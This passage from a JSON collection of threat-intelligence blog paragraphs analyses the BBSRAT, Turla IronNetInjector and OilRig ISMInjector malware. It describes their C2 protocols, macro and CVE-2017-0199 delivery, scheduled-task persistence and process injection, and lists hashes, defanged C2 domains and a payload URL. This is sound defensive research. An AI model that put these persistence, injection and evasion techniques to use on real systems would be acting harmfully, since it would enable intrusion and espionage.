                "When first executed, the malware will exfiltrate data about the victims machine via a POST request to the /bbs/[counter]/forum.php?sid=[counter] URL.",
                "All network data sent via POST requests uses a custom binary structure, as defined as the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The compressed_data field is compressed using the common ZLIB compression algorithm.",
                "Additionally, in the event data is being sent via HTTP rather than HTTPS, the following additional encryption algorithm is applied to the POST data:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following data structure holds the victims information that is uploaded by BBSRAT:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "BBSRAT accepts many possible commands that the C2 server can provide.",
                "These commands are sent as a response to the GET beacons that are continually requested via either HTTP or HTTPS.",
                "The following commands and sub-commands have been identified:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Please refer to the appendix for a full list of identified BBSRAT samples and their associated C2 servers."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As in many of the previous articles regarding espionage-motivated adversaries and possible nation-state campaigns, what is being observed in this attack campaign is a continued operation and evolution by the adversary even after its tactics, techniques, and procedures (TTPs) have become public knowledge.",
                "Despite the fact that the information about these attackers has been public for over a year, including a listing of many of the command and control servers, they continue to reuse much of their exposed playbook.",
                "We urge organizations to use the data from Unit 42 and other threat intelligence sources is paramount to proactively secure themselves and prevent attacks."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "WildFire properly classifies BBSRAT malware samples as malicious.",
                "We have released DNS signatures to block access to the C2 domain names included in this report.",
                "AutoFocus users can explore these attacks using the BBSRAT malware family tag."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "61a692e615e31b97b47a215479e6347fbd8e6e33d7c9d044766b4c1d1ae1b1fb\n22592a32b1193587a707d8b20c04d966fe61b37f7def7613d9bb91ff2fe9b13b\n2d81d65d09bf1b864d8964627e13515cee7deddfbd0dc70b1e67f123ab91421e\nd579255852720d794349ae2238f084c6393419af38479f3d0e3d2a21c9eb8e18\n0fc52c74dd54a97459e964b340d694d8433a3229f61e1c305477f8c56c538f27\n567a5b54d6c153cdd2ddd2b084f1f66fc87587dd691cd2ba8e30d689328a673f\n95f198ed29cf3f7d4ddd7cf688bfec9e39d92b78c0a1fd2288e13a92459bdb35\n6fae5305907ce99f9ab51e720232ef5acf1950826db520a847bf8892dc9578de\nb1737f3a1c50cb39cd9938d5ec3b4a6a10b711f17e917886481c38967b93e259\n71dc584564b726ed2e6b1423785037bfb178184419f3c878e02c7da8ba87c64d\n4ea23449786b655c495edf258293ac446f2216464b3d1bccb314ef4c61861101\n0baf36ca2d3772fdff989e2b7e762829d30db132757340725bb50dee3b51850c\n012ec51657d8724338a76574a39db4849579050f02c0103d46d406079afa1e8b\ne049bd90028a56b286f4b0b9062a8df2ab2ddf492764e3962f295e9ce33660e3\n77a2e26097285a794e42c9e813d14936d0e7a1dd3504205dd6b28a71626f8c3c\n5aa7db3344aa76211bbda3eaaccf1fc1b2e76df97ff9c30e7509701a389bd397\nfc4b465ee8d2053e9e41fb0a6ae32843e4e23145845967a069e584f582279725\n44171afafca54129b89a0026006eca03d5307d79a301e4a8a712f796a3fdec6e\n7438ed5f0fbe4b26afed2fe0e4e4531fc129a44d8ea416f12a77d0c0cd873520\n13d0bd83a023712b54c1dd391dfc1bc27b22d9df4fe3942e2967ec82d7c95640"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "adobeflashupdate.dynu[.]com\nadobeflashupdate1.strangled[.]net\ncdaklle.housejjk[.]com\nfuturesgolda[.]com\nherman.eergh[.]com\njowwln.cocolco[.]com\nkop.gupdiic[.]com\nloomon.gupdiicc[.]com\npagbine.ofhloe[.]com\npanaba.empleoy-plan[.]com\npeak.measurepeak[.]com\nprdaio.unbrtel[.]com\nsupport.yandexmailru[.]kr\nsystemupdate5.dtdns[.]net\ntestzake[.]com\ntransactiona[.]com\nwap.gxqtc[.]com\nwap.hbwla[.]com\nwap.kylxt[.]com\nwindowsupdate.dyn[.]nu\nwinwordupdate.dynu[.]com\nwww.testzake[.]com\nwww.yunw[.]top"
            ]
        }
    ],
    "70133016d6a00a72d07b5e22be9e3144af5c5733": [
        {
            "type": "paragraph",
            "content": [
                "In recent years, more and more ready-made malware is released on software development hosting sites available for everybody to use  including threat actors.",
                "This not only saves the bad guys development time, but also makes it much easier for them to find new ideas to prevent detection of their malware."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Unit 42 researchers have found several malicious IronPython scripts whose purpose is to load and run Turla\u2019s malware tools on a victim\u2019s system.",
                "The use of IronPython for malicious purposes isn\u2019t new, but the way Turla uses it is new.",
                "The overall method is known as Bring Your Own Interpreter (BYOI).",
                "It describes the use of an interpreter, not present on a system by default, to run malicious code of an interpreted programming or scripting language."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The first malicious IronPython scripts of the tool we describe here were discovered last year by a security researcher from FireEye.",
                "At the beginning of this year, another security researcher from Dragos pointed out some new scripts of the same threat actor uploaded to VirusTotal from two different submitters.",
                "We found that one of the submitters also uploaded two other samples, which are most likely embedded payloads of one of the IronPython scripts.",
                "These samples helped us to understand how this tool works, what malware it loads and which threat actor uses it."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While the IronPython scripts are only the first part of the tool, the main task of loading malware is done by an embedded process injector.",
                "We dubbed this toolchain IronNetInjector, the blend of IronPython and the injectors internal project name NetInjector.",
                "In this blog, we describe the IronPython scripts and how theyre used to load one or more payloads with the help of an injector."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from this threat through WildFire and Cortex XDR.",
                "AutoFocus customers can investigate this activity with the tag IronNetInjector."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "First, lets take a look at what IronPython is and why it was chosen as a loading vector.",
                "In the words of the IronPython team:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IronPython is an open-source implementation of the Python programming language which is tightly integrated with the .NET Framework.",
                "IronPython can use the .NET Framework and Python libraries, and other .NET languages can use Python code just as easily."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "And further:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IronPython's sweet-spot is being able to use the .NET framework APIs directly from Python."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "With IronPython, you can use .NET framework APIs directly in your Python script.",
                "It is a Python interpreter written entirely in C#.",
                "Currently, it fully supports Python 2, while support for Python 3 is still in development.",
                "As one of two official projects formerly developed by Microsoft, the other being IronRuby, it uses the Dynamic Language Runtime (DLR)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Now, it becomes clear why IronPython is also attractive for malware authors.",
                "You can make use of the .NET framework APIs without having to compile a .NET assembly.",
                "Of course, this requires the IronPython interpreter to also be present on the system, but that can be accomplished in different ways.",
                "Also, IronPython scripts dont run with the original Python interpreter when .NET framework APIs are used in the code.",
                "In case of a sandbox that supports Python scripts, the interpreter would simply crash without any dynamic analysis result.",
                "Further, as IronPython is written in C# and thus its process contains all the Common Language Runtime (CLR) on execution, one can easily load additional assemblies."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IronNetInjector is made of an IronPython script that contains a .NET injector and one or more payloads.",
                "The payloads can be also .NET assemblies (x86/64) or native PEs (x86/64).",
                "When an IronPython script is run, the .NET injector gets loaded, which in turn injects the payload(s) into its own or a remote process."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The key features of the malicious IronPython scripts are as follows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following screenshot shows one of the IronPython scripts decoded:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We have found two versions of the .NET injector, a newer variant internally named NetInjector compiled in 2019 and an earlier variant named PeInjector_x64 compiled in 2018.",
                "The earlier variant is much more limited in functionality compared to the 2019 variant."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Both versions are full-blown PE injection tools able to load a native x86/64 payload reflectively into a remote process.",
                "This is accomplished via unmanaged functions and the use of PeNet, a publicly available PE parser library written in C#.",
                "The decompiled code is self-explanatory as meaningful function, method and variable names are used throughout the code.",
                "Additionally, log and error messages are being used extensively."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Most of the code of the 2018 variant is taken from PowerShell Empires ReflectivePEInjection script and got translated into C#.",
                "Its written in a much more specific manner than the 2019 variant, which is a generically written injection tool.",
                "The newer version additionally contains the ability to inject .NET assemblies into unmanaged processes.",
                "Also, it can load payloads into its own process space, the IronPython interpreter process."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The newer injector has the following PDB path left:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C:\\Users\\Devel\\source\\repos\\c4\\agent\\build_tools\\agent_dll_to_Python_loader\\NetInjector\\NetInjector\\obj\\Release\\NetInjector.pdb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The same submitters who uploaded the IronPython scripts also submitted other files which are directly related to IronNetInjector.",
                "Based on the file sizes and the file sizes of the embedded payloads in the IronPython scripts, we can make some assumptions about what the payloads likely are."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following table shows the IronPython scripts categorized by the different VirusTotal submitters.",
                "It also shows which other samples uploaded by the same submitter or the other submitters are connected and gives the assumed embedded malware:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 1.",
                "Categorized IronPython samples according to VirusTotal submitters and their assumed payloads."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It becomes clear that IronNetInjector is mostly used to load ComRAT.",
                "In one case, a variant of the RPC backdoor is used and in another a payload that we couldnt associate with known malware."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We also couldnt verify how the IronPython scripts get run in the first place.",
                "One of the submitters uploaded a 7-Zip archive with the contents of the IronPython MSI file of version 2.7.0.40 from 2011.",
                "This archive also contains two IronPython scripts (see table) and a Windows task XML file named mssch.xml with the following content:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The task is used to start an IronPython script with the 64-bit version of the interpreter.",
                "As a command line argument, the Rijndael decryption key is passed.",
                "However, the key didnt decrypt on any of the embedded files in the scripts we found.",
                "The tasks description is PythonUpdateSrvc and it runs either on Windows startup when a user logs in or when one of two system events get created:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Depending on the system, the event with ID 8001 belongs to Microsoft Internet Information Services (IIS), Microsoft Exchange Server or Windows Server (Source: Netsurion EventTracker).",
                "The other event with ID 5324 is likely related to the logoff from Winlogon.",
                "Both triggers only happen when these events appear in the Microsoft-Windows-GroupPolicy(/Operational) event logs."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When we consider that the files in the 7-Zip archive were all taken from the same directory, we can make some assumptions.",
                "The attacker might have used the IronPython MSI to install the interpreter to C:\\ProgramData\\IronPython-2.7 on the victims system.",
                "The IronPython scripts and the Windows task XML were placed in the same directory.",
                "The task file is then used to create a task which in turn starts a script when triggered.",
                "However, its also possible that the submitter collected the files from different places and just bundled them into an archive for scanning purposes.",
                "Its also unclear why the attacker would use such an old version of IronPython."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Lets go briefly through the execution flow based on one of the scripts of VirusTotal submitter 4 that contains the 2019 variant of the injector and a ComRAT variant (SHA256: 3aa37559ef282ee3ee67c4a61ce4786e38d5bbe19bdcbeae0ef504d79be752b6)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When an IronPython script is run, it is loaded into the IronPython interpreter.",
                "In the IronPython script, the embedded .NET injector (SHA256: a56f69726a237455bac4c9ac7a20398ba1f50d2895e5b0a8ac7f1cdb288c32cc) and ComRAT DLL payload (SHA256: a62e1a866bc248398b6abe48fdb44f482f91d19ccd52d9447cda9bc074617d56) get decoded and decrypted.",
                "This is done with the Python Base64 module and the RijndaelManaged class from the C# cryptography namespace.",
                "The decryption key is passed as an argument to the IronPython script.",
                "The Rijndael initialization vector (IV) is stored in the script.",
                "Next, the .NET injector gets loaded into the IronPython process with the help of the Assembly.Load() method of the C# Reflection namespace.",
                "That's possible because IronPython itself is a .NET assembly and thus its process already contains all the .NET runtime libraries."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After the injector assembly is loaded, the ID of the process where the ComRAT DLL gets injected is retrieved.",
                "In this case, the explorer.exe was chosen.",
                "This routine to get the PID slightly differs in the IronPython scripts we found.",
                "While one script uses the C# method GetProcessesByName() to get the PID, the other scripts run the Windows tool tasklist.exe with the help of the Python os.popen() function.",
                "The output is then parsed to the targeted process ID with the help of tasklist filters.",
                "Also, some scripts filter the PID based on a Windows service name.",
                "When the PID is found, an instance of the injector assembly is created and the ComRAT payload bytes and PID are passed."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Finally, the injector's public methods Invoke() and InvokeVoid() get called.",
                "In the latter, the exported function name VFEP of the ComRAT payload gets passed.",
                "From this point on, the .NET injector takes control over the further execution."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The .NET injector contains the following namespaces:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "While the PeNet code is copied from the project, the namespace DefaultSerializer contains the injector code and is made of the following classes:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The DefaultSerializer class exposes four public methods:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "These methods are used pairwise.",
                "The method InjectAssembly is used to inject a .NET assembly into a native process (or its own) and InvokeAssemblyMethod to call any chosen method of the injected assembly.",
                "The method Invoke is used to inject a native PE into a remote process and InvokeVoid to call any exported function of the injected payload."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Depending on the number of arguments passed to DefaultSerializer on creation time, the payload is either loaded into its own process or a remote one.",
                "In case only the payload bytes are passed, it gets loaded into its own process space.",
                "The other options are to also pass the ID or handle of the remote process the payload gets injected to."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In our case, the second option is used with the PID of explorer.exe to load the ComRAT payload reflectively into the process."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "One other interesting aspect of the injector is its ability to load an assembly into an unmanaged process.",
                "This needs some preparation in the remote process, as you cannot simply load and execute a .NET assembly there if the CLR isnt present.",
                "This is accomplished with a native bootstrapper DLL, which gets injected into the remote process and prepares it so a .NET assembly can be injected afterwards."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "There are two bootstrappers (x86/64) contained in the NetBootstrapper class, which have the following PDB paths left:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "F:\\Dev\\NetInjector\\bin\\Release\\NetBootstrapper_Win32.pdb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "F:\\Dev\\NetInjector\\bin\\Release\\NetBootstrapper_x64.pdb"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Just like the injector itself, the bootstrappers contain meaningful function names (exported functions) and useful log messages.",
                "It uses the following exported functions:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "These functions are called from the injector to prepare and load a .NET assembly payload from the IronPython script into a remote process."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In all the IronPython scripts we found, only the native payload to native remote process injection option is used."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IronNetInjector is another toolset in Turlas ever-growing arsenal, made of an IronPython script and an injector.",
                "Its similar in structure to the previously used in-memory loading mechanism to execute malware with the help of PowerShell scripts.",
                "These scripts contain an embedded PE loader to execute an embedded malware payload."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The tool we discussed in this blogpost was likely developed to move away from PowerShell towards .NET.",
                "This general trend can be seen in recent years as detection of Powershell based threats became better, but also due to security mechanisms like AMSI introduced by Microsoft."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The .NET injectors and bootstrappers contain clean code and meaningful function/method/variable names, and they use detailed log/error messages.",
                "Only the initial IronPython scripts are obfuscated to prevent easy detection."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "There are still some questions we need answers for, such as what other samples get loaded beside ComRAT and the RPC backdoor?",
                "How do the IronPython scripts get run?",
                "And how is the interpreter deployed to a victims system?"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We will continue to monitor for this malware loading tool to get the missing pieces of the puzzle."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected from this malware tool.",
                "Our threat prevention platform WildFire detects it as malicious.",
                "Our extended detection and response platform Cortex XDR can identify and block the malware execution.",
                "AutoFocus customers can track the activity with the tag IronNetInjector."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b641687696b66e6e820618acc4765162298ba3e9106df4ef44b2218086ce8040",
                "(prophile.py, submitter 1)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c430ebab4bf827303bc4ad95d40eecc7988bdc17cc139c8f88466bc536755d4e",
                "(profilec.py, submitter 1)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c1b8ecce81cf4ff45d9032dc554efdc7a1ab776a2d24fdb34d1ffce15ef61aad (profile.py, submitter 2)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "8df0c705da0eab20ba977b608f5a19536e53e89b14e4a7863b7fd534bd75fd72 (10profilec.py, submitter 3)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b5b4d06e1668d11114b99dbd267cde784d33a3f546993d09ede8b9394d90ebb3 (120profilec.py, submitter 3)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "b095fd3bd3ed8be178dafe47fc00c5821ea31d3f67d658910610a06a1252f47d",
                "(220profile.py, submitter 3)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "3aa37559ef282ee3ee67c4a61ce4786e38d5bbe19bdcbeae0ef504d79be752b6 (profilec.py, submitter 4)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a56f69726a237455bac4c9ac7a20398ba1f50d2895e5b0a8ac7f1cdb288c32cc (2019 variant, submitter 4)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c59fadeb8f58bbdbd73d9a2ac0d889d1a0a06295f1b914c0bd5617cfb1a08ce9",
                "(2018 variant, submitter 5)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "63d7695dabefb97aa30cbe522647c95395b44321e1a3b08b8028e4000d1be15e"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ba17af72a9d90822eed447b8526fb68963f0cde78df07c16902dc5a0c44536c4"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "82333533f7f7cb4123bceee76358b36d4110e03c2219b80dced5a4d63424cc93 (IronPython-2.7.7z, submitter 1)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a62e1a866bc248398b6abe48fdb44f482f91d19ccd52d9447cda9bc074617d56 (ComRAT v4 variant, submitter 4)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "18c173433daafcc3aea17fc4f7792d0ff235f4075a00feda88aa1c9f8f6e1746 (RPC backdoor variant, submitter 5)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "a64e79a81b5089084ff88e3f4130e9d5fa75e732a1d310a1ae8de767cbbab061",
                "(RPC backdoor variant, submitter 5)"
            ]
        }
    ],
    "af9822ac27c214512105a9dfe65c6c542b57f8f7": [
        {
            "type": "paragraph",
            "content": [
                "Unit 42s ongoing research into the OilRig campaign shows that the threat actors involved in the original attack campaign continue to add new Trojans to their toolset and continue their persistent attacks in the Middle East.",
                "When we first discovered the OilRig attack campaign in May 2016, we believed at the time it was a unique attack campaign likely operated by a known, existing threat group.",
                "As we have progressed in our research and uncovered additional attack phases, tooling, and infrastructure as discussed in our recent posting Striking Oil: A Closer Look at Adversary Infrastructure, it has become apparent that the threat group responsible for the OilRig attack campaign is likely to be a unique, previously unknown adversary.",
                "Additionally, others have been referring to the group responsible for the OilRig campaign itself as the OilRig group as well.",
                "To that end, we are elevating the OilRig attack campaign to be known as the OilRig group."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In July 2017, we observed the OilRig group using a tool they developed called ISMAgent in a new set of targeted attacks.",
                "The OilRig group developed ISMAgent as a variant of the ISMDoor Trojan.",
                "In August 2017, we found this threat group has developed yet another Trojan that they call Agent Injector with the specific purpose of installing the ISMAgent backdoor.",
                "We are tracking this tool as ISMInjector.",
                "It has a sophisticated architecture and contains anti-analysis techniques that we have not seen in previous tools developed by this threat group.",
                "The complex structure and inclusion of new anti-analysis techniques may suggest that this group is increasing their development efforts in order to evade detection and gain higher efficacy in their attacks."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "On August 23, 2017, we observed OilRig targeting an organization within the United Arab Emirates government.",
                "The attack involved a spear-phishing email that had a subject of Importan Issue and two Zip archives attached, as seen in Figure 1.",
                "Note that Important is misspelled in the sample as shown below."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Delivery email that contains two Zip archives that contain the malicious delivery documents"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The message body in the attack email contains an image that is hosted on a remote server.",
                "As shown in Figure 2, hovering over the image shows that the URL link is to an image hosted at www.cdnakamaiplanet[.]com which we have reason to believe is an adversary owned domain.",
                "It is likely that the image was embedded to track if the recipient opened the email or not."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 URL associated with image included in delivery email"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Another interesting facet of this attack is that the email addresses in the To and From fields are from addresses from the same domain.",
                "Our initial assumption was that the email address in the From field was likely spoofed.",
                "Additional analysis of the email headers revealed that it did not contain a list of external email servers used to deliver the message as expected from a spoofed email; instead, we discovered the following string within the email headers:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Client=OWA;Mozilla/5.0 (Windows NT 6.3; rv:36.0)",
                "Gecko/20100101 Firefox/36.04;"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This string in the header suggests that the OilRig actor is likely to have used the targeted organizations Outlook Web Access (OWA) to send the phishing email using Firefox 36."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Using information from our research in the Striking Oil blog, we know the OilRig group has conducted credential harvesting campaigns specifically by emulating OWA login sites.",
                "Based on that research and this observation, we postulate that the OilRig group gathered credentials to a legitimate users OWA account and logged into the users account to send phishing attacks to other individuals within the same, targeted organization.",
                "Also, Firefox 36 was released in February 2015; since this email was sent August 2017, we believe it suggests the actors are using an outdated version of Firefox to log into the target organizations OWA."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The August 23, 2017 phishing attack contained two Zip archives to the email, Issue-doc.zip and Issue-doc1.zip.",
                "Each Zip attachment contains one file, with Issue.doc within Issue-doc.zip and Issue.dot within Issue-doc1.zip.",
                "The Issue.doc and Issue.dot files are both malicious documents that will attempt to run in Microsoft Word."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Issue.doc is a Word document that contains a malicious macro that the actors attempt to trick the victim into executing by instructing the user to click the Enable Content button as shown in Figure 3.",
                "We track this malicious delivery document as ThreeDollars."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 Malicious \u201cThreeDollars\u201d Microsoft Word Document"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once enabled, the macro reads in the initial document, searches the data for a delimiter of \"###$$$\" to find the base64 encoded payload then writes the encoded payload to the file %APPDATA%\\Base.txt.",
                "The following shows a hexdump of the delimiter followed by the encoded payload:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The macro runs a PowerShell command that will decode the contents of the %APPDATA%\\Base.txt file and save it to the file %PUBLIC%\\Libraries\\servicereset.exe, which it will then execute.",
                "The servicereset.exe file is a new tool in OilRigs arsenal that we call ISMInjector, which we will discuss in detail in the next section."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Issue.dot is a file that attempts to exploit CVE-2017-0199",
                "Microsoft Word Office/WordPad Remote Code Execution Vulnerability using the following code:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As displayed by the code example above, Index.dot file attempts to load a malicious exploit document hosted at msoffice-cdn[.]com, which is the same URL that hosted the exploit document used in an attack that ClearSky published on August 28, 2017.",
                "By correlating artifacts found in Index.dot, we discovered another sample attempting to exploit CVE-2017-0199 used in a separate attack, this time using office365-management[.]com as the C2 domain."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The resulting payload from this related delivery document is an ISMAgent Trojan that is configured to use msoffice365update[.]com as its C2 server.",
                "Please reference our previous blog on ISMAgent for more information on this Trojan."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Ultimately, the payload delivered by ThreeDollars is a new tool that we track as ISMInjector.",
                "As its name suggests, ISMInjector is a Trojan that is responsible for injecting a Trojan into another process.",
                "The payload embedded within the ISMInjector sample delivered in this attack is a variant of the ISMAgent backdoor that we had discussed in detail in our blog discussing a targeted attack on a Saudi Arabian technology company."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "At face value, ISMInjector is obfuscated with the off-the-shelf SmartAssembly",
                ".NET obfuscator created by red-gate.com.",
                "The first execution of ISMInjector starts by copying itself to %localappdata%\\srvBS.txt and enables persistent access to the system.",
                "The code achieves persistence by referencing two resources that contain commands the code will execute by running them within a command prompt process, as seen in the following screenshot:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The two resources that contain commands that ISMInjector uses for persistence are named Tsk1 and Tsk2.",
                "The specific commands within each of these resources are within Table 1.",
                "At a high level, theTsk1 command creates a scheduled task named ReportHealth that is meant to run a payload saved to \"%localappdata%\\srvHealth.exe every 4 minutes.",
                "The Tsk2 command creates a scheduled task that runs every 2 minutes that is responsible for saving the payload to srvHealth.exe.",
                "This task saves the payload to this location using the certutil command to decode the original payload saved to srvBS.txt."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1 Resources in ISMInjector containing commands for persistence"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Subsequent executions of the ISMInjector sample from srvHealth.exe will execute its functional code.",
                "ISMInjectors functional code is split into two different embedded modules named Inner.dll and Joiner.dll that work in conjunction to inject an embedded ISMAgent payload into another process.",
                "The two modules, which we will refer to as Joiner and Inner, have the following debug paths, which suggest the author of these modules refer to this Trojan as Agent Injector:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The main function within the ISMInjector assembly uses the Joiner module to construct the final payload and the Inner module to inject the final payload into a process.",
                "Figure 4 shows the ISMInjectors main function that uses the two modules to carry out its injection process before exiting."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 ISMInjector's main function uses methods within the Joiner and Inner modules"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Joiner module contains four resources named P11, P12, P21 and P22, which are all 35840 bytes of binary data.",
                "It reads the P11 and P12 resources and saves them to a variable, effectively concatenating them together.",
                "The module uses the same logic to concatenate the P21 and P22 resources together, and finally concatenates the P11+P12 variable with the P21+P22 variable, which results in the construction of a binary executable."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The ISMInjector code then calls the \"LoadDll\" method within the Inner module, providing the string \"Run\", the payload constructed by the Joiner module, and a path to the \"RegAsm.exe\" executable as arguments, as seen in Figure 4."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The LoadDLL method constructs an embedded assembly, using the same method as the Joiner module used to construct the final payload.",
                "However, the Inner module creates another module that is used to actually perform the code injection.",
                "To create this embedded module, the Inner module references two resources named D1 and D2 and concatenates them together.",
                "The resulting .NET assembly has a class called \"ClsV2\" that has a method named \"Run\", which is called in the LoadDll function call shown in Figure 4.",
                "The \"Run\" method within the ClsV2 class is invoked to execute the payload."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The \"Run\" method calls functions that has a state machine that dictates the actions taken.",
                "At a high level, these state machines attempt to create a process and inject the constructed payload into the newly created process.",
                "The use of state machines complicates analysis efforts because it makes the flow of execution jump around in a non-sequential fashion."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 2 contains the path through the state machines that ISMInjector uses to create a remote process, inject its embedded payload then run the payload.",
                "Each row of the table contains the current state, a description of the activities performed within that state, as well as the next state that will be set and run.",
                "The state values jump around dramatically, which requires an analyst to also jump around the code to determine its functionality.",
                "This is an interesting anti-analysis technique we have not seen the OilRig actors use in their other tools."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 2 State machines used by ISMInjector to inject and execute its payload in another process"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The executable injected into the RegAsm.exe process is a variant of the ISMAgent Trojan, which is very similar in behavior to the ISMAgent payload discussed in our previous blog.",
                "This ISMAgent payload is configured to use cdnmsnupdate[.]com as its C2 server using both HTTP and DNS tunneling channels."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It appears the OilRig group may have simply repurposed the injection code from an open source file called DynamicCallRunPE.cs, which is available on GitHub and Codegists.",
                "The actors did not use this code without modification; instead, they used state machines as an obfuscation technique to disguise the injection code."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The path that ISMInjector takes through the state machine and the activities are almost identical to the activities carried out in the DynamicCallRunPE.cs code.",
                "It is also possible that this portion of the ISMInjector was obfuscated by a crypter that the threat actors used to further complicate analysis."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Beginning with the initial phishing email, we discovered a significant infrastructure for this attack wave that also showed relationships to previous Oilrig attack campaigns both from an infrastructure perspective and shared code."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Much like previous Oilrig attacks, the C2 domains used typo-squatting techniques in order to attempt to evade detection.",
                "The image embedded within the phishing email is hosted on cdnakamaiplanet[.]com, which resolves to 82.102.14.216.",
                "As with other OilRig attacks, this IP is not reused to resolve to any other domain.",
                "However, two other IPs on the same /24 netblock are found to be used as C2s. 82.102.14.222 is found to resolve to Microsoft-publisher[.]com, which we observed as a C2 for our initial ISMAgent finding.",
                "82.102.14.246 resolves to adpolioe[.]com, hich appears to be a typo-squatted domain that also hosts a sample of ISMAgent at hxxp://82.102.14[.]246/webdav/aws.exe.",
                "This samples C2 is cdnmsnupdate[.]com which turns out to be the C2 server for three other samples, one ISMAgent and two of them being ISMAgentInjector.",
